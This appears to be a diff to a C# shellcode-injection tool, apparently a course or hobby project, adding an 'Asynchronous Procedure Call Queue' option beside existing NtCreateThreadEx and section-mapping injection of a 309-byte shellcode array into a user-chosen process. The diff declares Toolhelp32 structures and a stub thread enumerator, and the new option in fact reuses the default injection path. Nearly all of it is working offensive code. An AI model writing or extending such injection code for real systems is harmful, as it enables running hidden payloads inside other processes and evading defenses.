@@ -79,6 +79,51 @@ namespace ECE264project
             UInt32 SectionPageProtection,
             UInt32 AllocationAttributes,
             IntPtr FileHandle);
+
+            [Flags]
+            public enum SnapshotFlags : uint
+            {
+                HeapList = 0x00000001,
+                Process = 0x00000002,
+                Thread = 0x00000004,
+                Module = 0x00000008,
+                Module32 = 0x00000010,
+                All = (HeapList | Process | Thread | Module),
+                Inherit = 0x80000000,
+                NoHeaps = 0x40000000
+
+            }
+
+            [StructLayout(LayoutKind.Sequential)]
+            public struct PROCESSENTRY32
+            {
+                public uint dwSize;
+                public uint cntUsage;
+                public uint th32ProcessID;
+                public IntPtr th32DefaultHeapID;
+                public uint th32ModuleID;
+                public uint cntThreads;
+                public uint th32ParentProcessID;
+                public int pcPriClassBase;
+                public uint dwFlags;
+            };
+
+            [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
+
+            public struct THREADENTRY32
+
+            { 
+                public UInt32 dwSize;
+                public UInt32 cntUsage;
+                public UInt32 th32ThreadID;
+                public UInt32 th32OwnerProcessID;
+                public UInt32 tpBasePri;
+                public UInt32 tpDeltaPri;
+                public UInt32 dwFlags;
+            }
+
+            [DllImport("kernel32.dll", SetLastError = true)]
+            static extern IntPtr CreateToolhelp32Snapshot(SnapshotFlags dwFlags, uint th32ProcessID);
             public static void Main(string[] args)
             {
                 byte[] shellcode = new byte[309]
@@ -176,7 +221,9 @@ ___) (__| )  \  |\_)  ) | (____/\ (____/\  | |  | (___) | ) \ \__
 
                 string logo2 = @"1) Default Injection (NtWriteProcessMemory & NtCreateThreadEx)
 
-2) Section Mapping (NtCreateSection & NtMapViewOfSection)";
+2) Section Mapping (NtCreateSection & NtMapViewOfSection)
+
+3) Asynchronous Procedure Call Queue (NtQueueApcThread)";
                 Console.WriteLine(logo);
                 Console.WriteLine(logo2);
                 uint PID;
@@ -184,7 +231,7 @@ ___) (__| )  \  |\_)  ) | (____/\ (____/\  | |  | (___) | ) \ \__
                 OBJECT_ATTRIBUTES oBJECT_ATTRIBUTES = new OBJECT_ATTRIBUTES(); 
                 CLIENT_ID cLIENT_ID = new CLIENT_ID();
                 IntPtr phandle = IntPtr.Zero;
-                Console.Write("\nSelect 1 or 2: ");
+                Console.Write("\nSelect 1, 2, or 3: ");
                 int selection = int.Parse(Console.ReadLine());
                 while (valid != 1)
                     switch (selection)
@@ -212,6 +259,18 @@ ___) (__| )  \  |\_)  ) | (____/\ (____/\  | |  | (___) | ) \ \__
                             NtClose(phandle);
                             Console.ReadLine();
                             valid = 1;
+                            break;
+                        case 3:
+                            PROCESSENTRY32 pROCESSENTRY;
+                            THREADENTRY32 tHREADENTRY32;
+                            pROCESSENTRY.dwSize = (uint)Marshal.SizeOf(typeof(PROCESSENTRY32));
+                            tHREADENTRY32.dwSize = (uint)Marshal.SizeOf(typeof(THREADENTRY32));
+                            Console.Write("Enter a process ID: ");
+                            PID = uint.Parse(Console.ReadLine());
+                            APC.enumerateThreads(PID);
+                            phandle = DefaultInjector.ProcessHandler(PID, oBJECT_ATTRIBUTES, cLIENT_ID);
+                            baseAddress = DefaultInjector.MemoryAllocater(phandle, shellcode, PID);
+                            result = DefaultInjector.injectShellcode(phandle, baseAddress, shellcode, PID);
                             break;
                         default:
                             Console.WriteLine("Please select a valid process injection technique");
@@ -327,6 +386,14 @@ ___) (__| )  \  |\_)  ) | (____/\ (____/\  | |  | (___) | ) \ \__
                         return remotebaseAddress;
                     }
 
+                }
+            }
+            public class APC
+            { 
+                public static bool enumerateThreads(uint PID)
+                {
+                    IntPtr hSnapshot = CreateToolhelp32Snapshot(SnapshotFlags.All, PID);
+                  return true;
                 }
             }
 
